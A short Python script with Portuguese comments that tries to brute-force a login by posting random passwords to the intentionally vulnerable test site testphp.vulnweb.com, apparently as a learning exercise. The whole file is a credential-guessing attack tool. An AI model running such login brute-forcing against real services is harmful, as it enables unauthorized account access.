import requests
import string
import secrets
import random

# Método: http://testphp.vulnweb.com/userinfo.php - POST
# Username: test
# Password: test

# Gera senhas aleatoriamente, usando letras, digitos, pontos e números
# Outra possível abordagem seria utilizar uma lista de senhas mais comuns e/ou manipulá-las com novos caracteres
def gerar_senha(length):
    caracteres = string.ascii_letters + string.digits + string.punctuation + "1234567890"

    # Uso a biblioteca secrets para escolher aleatoriamente um caracter
    senha = ''.join(secrets.choice(caracteres) for i in range(length))
    return senha

# Dicionário com os parametros que a request espera
params = {
    'uname': 'test',
    'pass': ''
}

senha_quebrada = False

for i in range (10):
    senha = gerar_senha(random.randint(4, 12))
    params['pass'] = senha
    print("testando login com a senha: ", senha)

    requisicao = requests.post('http://testphp.vulnweb.com/userinfo.php', data=params)

    # Verifica se o método retorna um HTML contendo o título 'user info'
    # (Página que o usuário é redirecionado ao se autenticar)
    if "<title>user info</title>" in str(requisicao.content):
        senha_quebrada = True
        print("\nSenha encontrada!"
              "\nSenha: ", senha)

        break

if not senha_quebrada:
    print("\nNão foi possível quebrar a senha.")